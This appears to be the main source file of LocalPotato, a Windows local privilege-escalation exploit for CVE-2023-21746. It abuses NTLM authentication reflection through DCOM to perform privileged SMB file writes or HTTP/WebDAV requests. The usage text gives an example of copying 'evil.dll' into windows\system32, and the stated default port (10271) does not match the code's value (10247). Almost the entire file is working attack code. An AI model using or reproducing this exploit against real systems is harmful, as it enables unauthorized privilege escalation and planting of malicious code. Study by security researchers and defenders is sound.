#include "Windows.h"
#include "stdio.h"
#include "DCOMReflection.h"
#include "PotatoTrigger.h"
#include "SMBClient.h"
#include "HTTPClient.h"

void usage();
wchar_t* destfname = NULL;
wchar_t* inputfname = NULL;
wchar_t* httpHost = NULL;
wchar_t* httpPageUrl = NULL;

int wmain(int argc, wchar_t** argv) 
{
	printf("\n\n\t LocalPotato (aka CVE-2023-21746 & HTTP/WebDAV) \n");
	printf("\t by splinter_code & decoder_it\n\n");
	WCHAR defaultClsidStr[] = L"{854A20FB-2D44-457D-992F-EF13785D2B51}"; // Print Notify Service CLSID
	WCHAR defaultComPort[] = L"10247";
	PWCHAR clsidStr = defaultClsidStr;
	PWCHAR comPort = defaultComPort;
	HANDLE hTread;
	int cnt = 1;

	while ((argc > 1) && (argv[cnt][0] == '-'))
	{
		switch (argv[cnt][1])
		{
		case 'c':
			++cnt;
			--argc;
			clsidStr = argv[cnt];
			break;
		case 'p':
			++cnt;
			--argc;
			comPort = argv[cnt];
			break;
		case 'h':
			usage();
			exit(0);
		case 'o':
			++cnt;
			--argc;
			if (*argv[cnt] == '\\')
				++argv[cnt];
			destfname = argv[cnt];
			break;
		case 'i':
			++cnt;
			--argc;
			inputfname = argv[cnt];
			break;
		case 'u':
			++cnt;
			--argc;
			httpPageUrl = argv[cnt];
			break;
		case 'r':
			++cnt;
			--argc;
			httpHost = argv[cnt];
			break;
		default:
			printf("Wrong Argument: %S\n", argv[cnt]);
			usage();
			exit(-1);
		}
		++cnt;
		--argc;
	}

	if (destfname == NULL && httpHost == NULL) {
		usage();
		return 1;
	}

	if (destfname != NULL && inputfname == NULL)
	{
		usage();
		return 1;
	}

	if (httpHost != NULL && httpPageUrl == NULL)
	{
		usage();
		return 1;
	}

	if(destfname != NULL)
		hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(SMBAuthenticatedFileWrite), NULL, 0, NULL);
	else
		hTread = CreateThread(0, 0, reinterpret_cast<LPTHREAD_START_ROUTINE>(HTTPAuthenticatedGET), NULL, 0, NULL);
	HookSSPIForDCOMReflection();
	PotatoTrigger(clsidStr, comPort, hTread);
	if (WaitForSingleObject(hTread, 3000) == WAIT_TIMEOUT) {
		printf("[-] The privileged process failed to communicate with our COM Server :(");
	}
	return 0;
}

void usage()
{
	printf("\n");
	printf("Mandatory Args: \n"
		"SMB:\n\t-i Source file to copy for SMB\n"
		"\t-o Output file for SMB - do not specify the drive letter\n"
		"HTTP:\n\t-r host/ip for HTTP\n"
		"\t-u target URL for HTTP\n"
	);
	printf("\nOptional Args: \n"
		"-c CLSID (Default {854A20FB-2D44-457D-992F-EF13785D2B51})\n"
		"-p COM server port (Default 10271)\n"
	);
	printf("\nExamples: \n"
		"- SMB:\n\t LocalPotato.exe -i c:\\hacker\\evil.dll -o windows\\system32\\evil.dll\n"
		"- HTTP/WebDAV:\n\t LocalPotato.exe -r 127.0.0.1 -u /webdavshare/potato.local\n\n"
	);
}